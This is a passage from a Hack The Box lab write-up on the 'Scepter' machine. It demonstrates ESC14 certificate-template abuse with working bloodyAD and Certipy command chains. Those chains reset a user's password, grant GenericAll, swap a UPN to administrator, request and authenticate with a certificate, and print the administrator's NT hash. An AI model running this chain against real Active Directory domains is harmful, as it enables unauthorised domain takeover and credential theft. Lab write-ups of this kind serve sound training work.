![](https://cdn-images-1.medium.com/max/800/1*NJYSdq4jJ-KxRcDDzweXhA.png)

![](https://cdn-images-1.medium.com/max/800/1*qgiBzsO2IJvram_JfePpEw.png)

![](https://cdn-images-1.medium.com/max/800/0*UvxBuFjMHnib09Lk.gif)

```bash
┌──(root㉿kali)-[/home/kali/Desktop/htb/scepter]  
└─# openssl pkcs12 -in administrator.pfx -clcerts -nokeys | openssl x509 -text -noout | less
```

Make sure to pipe the output with the `less` command, then hit **Enter** to view it. You’ll now see the UPN of the `Administrator` user. We’ll update this UPN using **Certipy** to ensure it correctly belongs to the Administrator. After that, we’ll request the certificate and authenticate with it.

> ⚠️ Important: If any step fails, it’s likely because the machine was reset, which also resets the configuration related to the ESC14 scenario. So make sure to reassign the permissions again using BloodyAD .

![](https://cdn-images-1.medium.com/max/800/1*ppGHIUtFry46hKO60VW4Ig.png)

The reason for the failure is that the UPN is for ‘administrator’, but the CN belongs to ‘d.baker so make sure to check for upn and disable email -namd and include email name in subject name

![](https://cdn-images-1.medium.com/max/800/1*Ohf8ZBgWAPktFzmkIOvt_w.png)

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/new]  
└─# bloodyAD --host dc01.scepter.htb -d "scepter.htb" -u d.baker -p ':18b5fb0d99e7a475316213c15b6f22ce' set password "  
a.carter" 'Maverick123!'  
[+] Password changed successfully!  
  
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/new]  
└─# bloodyAD --host dc01.scepter.htb -d scepter.htb -u a.carter -p 'Maverick123!' add genericAll "OU=STAFF ACCESS CER  
TIFICATE,DC=SCEPTER,DC=HTB" a.carter  
[+] a.carter has now GenericAll on OU=STAFF ACCESS CERTIFICATE,DC=SCEPTER,DC=HTB  
  
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/new]  
└─# certipy account -u a.carter -p 'Maverick123!' -dc-ip 10.10.11.65 -upn administrator@scepter.htb -user d.baker update  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Updating user 'd.baker':  
userPrincipalName : administrator@scepter.htb  
[*] Successfully updated 'd.baker'
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/new]  
└─# certipy account -u a.carter -p 'Maverick123!' -dc-ip 10.10.11.65 -upn administrator@scepter.htb -user d.baker update  
  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Updating user 'd.baker':  
userPrincipalName : administrator@scepter.htb  
[*] Successfully updated 'd.baker'  
  
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/new]  
└─# certipy req -username d.baker@scepter.htb -hashes :18b5fb0d99e7a475316213c15b6f22ce -target dc01.scepter.htb -ca scepter-DC01-CA -template StaffAccessCertificate -dc-ip 10.10.11.65  
  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 37  
[*] Successfully requested certificate  
[*] Got certificate with UPN 'administrator@scepter.htb'  
[*] Certificate has no object SID  
[*] Try using -sid to set the object SID or see the wiki for more details  
[*] Saving certificate and private key to 'administrator.pfx'  
[*] Wrote certificate and private key to 'administrator.pfx'  
  
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/new]  
└─# certipy account -u a.carter -p 'Maverick123!' -dc-ip 10.10.11.65 -upn maverick -user d.baker update  
  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Updating user 'd.baker':  
userPrincipalName : maverick  
[*] Successfully updated 'd.baker'  
  
┌──(root㉿kali)-[/home/…/Desktop/htb/scepter/new]  
└─# certipy auth -pfx administrator.pfx -dc-ip 10.10.11.65 -domain scepter.htb  
Certipy v5.0.2 - by Oliver Lyak (ly4k)  
  
[*] Certificate identities:  
[*] SAN UPN: 'administrator@scepter.htb'  
[*] Using principal: 'administrator@scepter.htb'  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saving credential cache to 'administrator.ccache'  
[*] Wrote credential cache to 'administrator.ccache'  
[*] Trying to retrieve NT hash for 'administrator'  
[*] Got hash for 'administrator@scepter.htb': aad3b435b51404eeaad3b435b51404ee:f6d9428081ca60b099a0d776a4f2b94c
```

![](https://cdn-images-1.medium.com/max/800/0*FzAS73hU1lQmSuoy.gif)

> Attention ⚠️ : The sequence is: update the UPN to be Administrator, then request the certificate. Then update the UPN again with any silly user, then auth with administrator.pfx certificate you will get TGT.

![](https://cdn-images-1.medium.com/max/800/1*-amnzvJ9bk20D82xUmdC0w.png)

---

![](https://cdn-images-1.medium.com/max/800/0*xVd0ye29MGPSnXln.gif)

*amm really wanna go ??*

**I’ll be adding more scenarios for this machine in the future. For now, I’ll wrap things up with a quick overview of ESC14.**

### References

> 🔗 [https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9)

> 🔗 [https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-weak-explicit-mapping](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc14-weak-explicit-mapping)

> 🔗 [https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html?highlight=esc14#vulnerable-certificate-renewal-configuration--esc14](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html?highlight=esc14#vulnerable-certificate-renewal-configuration--esc14)

> 🔗 [https://mayfly277.github.io/posts/ADCS-part14/#esc14-a---write-access-on-altsecurityidentities](https://mayfly277.github.io/posts/ADCS-part14/#esc14-a---write-access-on-altsecurityidentities)

> 🔗 [https://cicada-8.medium.com/adcs-so-u-got-certificate-now-ive-got-nine-ways-to-abuse-it-861081cff082](https://cicada-8.medium.com/adcs-so-u-got-certificate-now-ive-got-nine-ways-to-abuse-it-861081cff082)

---

### Wanna Keep in Touch with Maverick?

![](https://cdn-images-1.medium.com/max/800/0*QiFzFwdwons8kr5I.gif)

Don’t forget to follow me on [LinkedIn ](https://www.linkedin.com/in/0xmaverick/)and [Twitter](https://x.com/mavric1337), and give me some respect on [Hack The Box!](https://app.hackthebox.com/profile/1054724) i love chatting with like-minded people, sharing knowledge, and learning from everyone. Happy hacking!

By Mohamed Eletreby on July 21, 2025.

Canonical link

Exported from Medium on April 20, 2026.